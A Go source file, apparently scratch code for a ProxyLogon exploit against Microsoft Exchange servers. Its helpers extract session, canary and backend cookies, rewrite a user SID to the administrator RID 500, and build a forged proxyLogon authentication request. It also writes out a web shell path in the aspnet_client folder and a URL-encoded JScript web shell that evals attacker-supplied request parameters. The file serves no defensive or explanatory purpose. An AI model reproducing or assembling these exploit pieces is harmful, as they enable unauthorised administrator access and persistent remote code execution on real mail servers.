package main

import (
	"fmt"
	"math/rand"
	"strconv"
	"strings"
	"time"
)

func splitsid(sid string) string {
	sid1 := strings.Split(sid, "-")
	sid2 := sid1[len(sid1)-1]

	fmt.Println(sid2)
	return sid2
}

func modifysid(sid string) string {
	sid1 := strings.Split(sid, "-")
	sid2 := sid1[len(sid1)-1]
	sid3 := strings.Split(sid, sid2)
	sid4 := sid3[0] + "500"

	fmt.Println(sid4)
	return sid4
}

func splitmsexch(msexch string) string {
	msexch1 := strings.Split(msexch, "msExchEcpCanary=")
	msexch2 := msexch1[len(msexch1)-1]
	msexch3 := strings.Split(msexch2, ";")
	msexch4 := msexch3[0]

	return msexch4
}

func splitsess(sess string) string {
	sess1 := strings.Split(sess, "ASP.NET_SessionId=")
	sess2 := sess1[len(sess1)-1]
	sess3 := strings.Split(sess2, ";")
	sess4 := sess3[0]

	return sess4
}

func splitBackEnd(sess string) string {
	sess1 := strings.Split(sess, "X-BackEndCookie=")
	sess2 := sess1[len(sess1)-1]
	sess3 := strings.Split(sess2, ";")
	sess4 := sess3[0]

	return sess4
}
func splitMasterAccountSid(sess string) string {
	sess1 := strings.Split(sess, "with SID ")
	sess2 := sess1[len(sess1)-1]
	sess3 := strings.Split(sess2, " and MasterAccountSid")
	sess4 := sess3[0]

	return sess4
}

func main() {
	sid := "casd-casd-c-asdc-asdc-1001"
	if splitsid(sid) != "500" {
		sid = modifysid(sid)
	}
	fmt.Println("Fixed User SID: " + sid)
	shell_name := "lUc1f3r11.aspx"
	shell_path := "inetpub\\wwwroot\\aspnet_client\\" + shell_name
	fmt.Println(shell_path)
	shell_absolute_path := "\\\\127.0.0.1\\c$\\" + shell_path
	fmt.Println(shell_absolute_path)
	shell_content := "%3Cscript%20language%3D%22JScript%22%20runat%3D%22server%22%3E%20function%20Page_Load%28%29%7B%2F%2A%2A%2Feval%28Request%5B%22evilc0rp%22%5D%2C%22unsafe%22%29%3B%7D%3C%2Fscript%3E"
	fmt.Println(shell_content)
	random_name := strconv.FormatInt(int64(rand.New(rand.NewSource(time.Now().UnixNano())).Int31n(1000)), 10) + ".js"
	fmt.Println(random_name)
	proxyLogon_request := `<r at="Negotiate" ln="john"><s>` + sid + `</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>`
	fmt.Println(proxyLogon_request)
	sess := "ASP.NET_SessionId=casdcasdc-cas-dc-asd-ca-sdc-as-dcasdccdscasd; path=/; httponly"
	fmt.Println(splitsess(sess))
	msexch := "msExchEcpCanary=casdcasdjcasdkcnajkn23i4bri234hf834f858f.; path=/ecp"
	fmt.Println(splitmsexch(msexch))
	BackEnd := "X-BackEndCookie=s-1-5-1b=casdcjajnkdcjasjdcsadncjasdvfv//923429458; path=/;"
	fmt.Println(splitBackEnd(BackEnd))
	sid1 := "with SID S-1-5-21-123452345-23452345-23452345-1001 and MasterAccountSid"
	fmt.Println(splitMasterAccountSid(sid1))
}
